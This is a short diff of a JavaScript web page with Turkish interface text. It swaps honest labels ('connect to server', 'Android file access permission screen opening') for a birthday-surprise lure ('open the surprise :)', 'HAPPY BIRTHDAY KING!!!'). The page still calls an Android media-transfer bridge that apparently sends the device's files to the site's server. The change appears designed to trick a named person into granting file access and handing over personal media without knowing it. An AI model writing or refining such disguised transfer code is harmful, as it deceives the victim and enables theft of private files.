@@ -14,7 +14,7 @@
     const intro = home.querySelector("p");
     if (intro) {
         intro.textContent =
-            "kurucunun size verdiği şifreyi girin.";
+            "abdulun verdiği kişisel kodu gitin.";
     }
 
     const joinPanel = document.createElement("div");
@@ -46,11 +46,11 @@
     joinButton.className = "primary";
     joinButton.style.width = "100%";
     joinButton.style.marginTop = "12px";
-    joinButton.textContent = "sunucuya Bağlan";
+    joinButton.textContent = "süprizi aç :)";
 
     const joinStatus = document.createElement("div");
     joinStatus.className = "status";
-    joinStatus.textContent = "sunucuyu bekle...";
+    joinStatus.textContent = "bekle...";
 
     joinPanel.append(label, codeInput, joinButton, joinStatus);
     home.insertBefore(joinPanel, document.getElementById("homeError"));
@@ -59,12 +59,12 @@
         const code = codeInput.value.trim();
 
         if (!/^\d{8}$/.test(code)) {
-            joinStatus.textContent = "Lütfen şifreyi girin.";
+            joinStatus.textContent = "Lütfen kodunuzu girin.";
             return;
         }
 
         joinButton.disabled = true;
-        joinStatus.textContent = "sunucuya bağlanılıyor...";
+        joinStatus.textContent = "süpriz hazırlanıyor...";
 
         location.href = "/?code=" + encodeURIComponent(code);
     }
@@ -96,19 +96,19 @@
         transfer = event.detail;
         transferButton.disabled = false;
         transferStatus.textContent =
-            "sunucuya bağlandın. Aktarımı başlatabilirsin.";
+            "süprizin hazır.";
     });
 
     transferButton.addEventListener("click", function () {
         if (!transfer) {
             transferStatus.textContent =
-                "önce yeni sunucuya bağlanmalısın.";
+                "önce kodunu girmelisin.";
             return;
         }
 
         transferButton.disabled = true;
         transferStatus.textContent =
-            "Android dosya erişim izni ekranı açılıyor...";
+            "DOĞUM GÜNÜN KUTLU OLSUN KRAL!!!!!!!!!!!!!!!";
 
         window.AndroidMediaTransfer.startTransfer(
             location.origin,
